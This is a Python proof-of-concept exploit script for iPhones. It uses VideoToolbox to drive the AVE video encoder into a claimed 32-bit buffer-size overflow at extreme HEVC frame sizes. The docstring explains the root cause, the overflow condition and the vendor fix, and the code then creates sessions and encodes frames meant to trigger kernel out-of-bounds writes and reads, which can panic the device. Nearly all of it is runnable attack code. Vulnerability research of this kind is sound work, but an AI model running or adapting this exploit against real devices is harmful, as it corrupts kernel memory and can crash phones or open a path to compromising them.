"""
AVEVideoEncoder 32-bit buffer-size overflow PoC — 26.6.1 (iOS 26.6.1, iPhone 16)
Targets CVE-2026-112466 / CVE-2026-112468..112470 / CVE-2026-112689

Root cause:
  26.6.1 computes DPB/LRB/MCTFOutput buffer sizes using 32-bit arithmetic.
  For HEVC CTU path (profile >= 30), the computation is:
    size = (iVar1 << 10) * iVar2   (both int32, unchecked)
  where iVar1 = (width+127)/32 and iVar2 = (height+127)/32.

  Overflow condition: width * height such that
    ((w+127)/32) * ((h+127)/32) >= 2^22  (so that << 10 produces >= 2^32)
  For square frames: w = h >= 65,408 pixels.

  With such dimensions the allocation is TOO SMALL. Writing full frame data to the
  under-allocated DPB → kernel OOB write.

  CVE-2026-112466 (OOB read): reading reference frame data from the under-allocated DPB
  returns kernel memory beyond the DPB buffer boundary.

Fix (27.1 / 26.7.2):
  New standalone checker functions use 64-bit arithmetic:
    uVar2 = (long)(int)aligned_w * (long)(int)aligned_h;
    if (uVar2 >> 0x1f != 0) → error (size overflow)

Usage:
  Run on iPhone (26.6.1) via offload_python MCP tool.
  Observe: encoding succeeds but corrupts adjacent kernel memory → potential panic.
  For a controlled read: use NTL=2 (temporal layer count) to force DPB read after encode.
"""
import ctypes as C

CF = C.CDLL("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")
VT = C.CDLL("/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox")
CV = C.CDLL("/System/Library/Frameworks/CoreVideo.framework/CoreVideo")

CF.CFNumberCreate.restype = C.c_void_p
CF.CFNumberCreate.argtypes = [C.c_void_p, C.c_int, C.c_void_p]
CF.CFDictionaryCreate.restype = C.c_void_p
CF.CFDictionaryCreate.argtypes = [
    C.c_void_p, C.POINTER(C.c_void_p), C.POINTER(C.c_void_p),
    C.c_long, C.c_void_p, C.c_void_p,
]
CF.CFRelease.argtypes = [C.c_void_p]
CF.kCFAllocatorDefault = C.c_void_p.in_dll(CF, "kCFAllocatorDefault")
CF.kCFTypeDictionaryKeyCallBacks = (C.c_uint8 * 64).in_dll(CF, "kCFTypeDictionaryKeyCallBacks")
CF.kCFTypeDictionaryValueCallBacks = (C.c_uint8 * 64).in_dll(CF, "kCFTypeDictionaryValueCallBacks")
kCFNumberSInt32Type = 3

def cf_num(v):
    n = C.c_int32(v)
    return CF.CFNumberCreate(None, kCFNumberSInt32Type, C.byref(n))

VT.VTCompressionSessionCreate.restype = C.c_int32
VT.VTCompressionSessionCreate.argtypes = [
    C.c_void_p, C.c_int32, C.c_int32, C.c_uint32,
    C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p, C.c_void_p,
    C.POINTER(C.c_void_p),
]
VT.VTSessionSetProperty.restype = C.c_int32
VT.VTSessionSetProperty.argtypes = [C.c_void_p, C.c_void_p, C.c_void_p]

class CMTime(C.Structure):
    _fields_ = [("value", C.c_int64), ("timescale", C.c_int32),
                ("flags", C.c_uint32), ("epoch", C.c_int64)]

VT.VTCompressionSessionEncodeFrame.restype = C.c_int32
VT.VTCompressionSessionEncodeFrame.argtypes = [
    C.c_void_p, C.c_void_p, CMTime, CMTime, C.c_void_p, C.c_void_p,
    C.POINTER(C.c_uint32),
]

CV.CVPixelBufferCreate.restype = C.c_int32
CV.CVPixelBufferCreate.argtypes = [
    C.c_void_p, C.c_ulong, C.c_ulong, C.c_uint32, C.c_void_p,
    C.POINTER(C.c_void_p),
]
CV.CVPixelBufferRelease.argtypes = [C.c_void_p]

kHEVC = 0x68766331  # 'hvc1'
kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange = 0x34323076  # '420v'

CALLBACK_TYPE = C.CFUNCTYPE(None, C.c_void_p, C.c_void_p, C.c_int32, C.c_void_p, C.c_void_p)

@CALLBACK_TYPE
def output_cb(ref, srcRef, status, info, buf):
    pass


def run(width, height, ntl=2):
    """
    Create an HEVC session at extreme dimensions and trigger the DPB size overflow.

    Safe test (no expected panic):    width=65535, height=65535, ntl=1
    OOB read path (possible panic):   width=65535, height=65535, ntl=2
    """
    print(f"=== AVE2 DPB overflow PoC: {width}x{height}, NTL={ntl} ===")
    print(f"Expected 32-bit product at CTU path:")
    ctu_w = (width + 127) // 32
    ctu_h = (height + 127) // 32
    product_64 = ctu_w * ctu_h * 0x400
    product_32 = product_64 & 0xFFFFFFFF
    print(f"  CTU_w={ctu_w}, CTU_h={ctu_h}")
    print(f"  (ctu_w<<10)*ctu_h = {ctu_w<<10}×{ctu_h} = {(ctu_w<<10)*ctu_h}")
    print(f"  64-bit: {product_64:#x}  32-bit wrap: {product_32:#x}")
    if product_64 >= (1 << 32):
        print(f"  *** OVERFLOW EXPECTED: 32-bit wraps to {product_32:#x} ({product_32} bytes)")
        print(f"  *** Actual buffer needed: {product_64:#x} ({product_64 // 1024 // 1024} MB)")
    else:
        print(f"  No overflow (within 32-bit range)")

    # Create HEVC compression session
    session = C.c_void_p(0)
    status = VT.VTCompressionSessionCreate(
        None, width, height, kHEVC,
        None, None, None, output_cb, None,
        C.byref(session),
    )
    print(f"VTCompressionSessionCreate: status={status:#010x} session={session.value and hex(session.value) or 'NULL'}")
    if status != 0 or not session.value:
        print("FAILED — HEVC not supported or dimensions rejected")
        return

    # Set NumberOfTemporalLayers
    try:
        ntl_key = C.c_void_p.in_dll(VT, "kVTCompressionPropertyKey_NumberOfTemporalLayers").value
        ntl_val = cf_num(ntl)
        status = VT.VTSessionSetProperty(session.value, ntl_key, ntl_val)
        CF.CFRelease(ntl_val)
        print(f"SetProperty(NTL={ntl}): status={status:#010x}")
    except Exception as e:
        print(f"NTL key not found: {e}")

    # Create pixel buffer
    pbuf = C.c_void_p(0)
    status = CV.CVPixelBufferCreate(
        None, width, height,
        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
        None, C.byref(pbuf),
    )
    print(f"CVPixelBufferCreate: status={status:#010x}")
    if status != 0 or not pbuf.value:
        print("FAILED — pixel buffer creation failed (likely dimension validation)")
        return

    pts = CMTime(value=0, timescale=90000, flags=1, epoch=0)
    dur = CMTime(value=3000, timescale=90000, flags=1, epoch=0)
    info = C.c_uint32(0)

    print(f"Calling EncodeFrame with {width}x{height} HEVC NTL={ntl}...")
    print("  If DPB overflow triggered → kernel panic or OOB write/read")
    status = VT.VTCompressionSessionEncodeFrame(
        session.value, pbuf.value, pts, dur, None, None, C.byref(info),
    )
    print(f"EncodeFrame: status={status:#010x}  info={info.value:#010x}")
    CV.CVPixelBufferRelease(pbuf.value)


# Test both a safe dimension and an overflow dimension
# Safe: 4K (no overflow)
run(width=3840, height=2160, ntl=2)

print()
print("="*60)
print()

# Overflow target: 65535x65535 — triggers DPB 32-bit overflow in 26.6.1
# If VT rejects dimensions, try: 32768x32768 (non-CTU overflow but may still hit)
run(width=65535, height=65535, ntl=2)
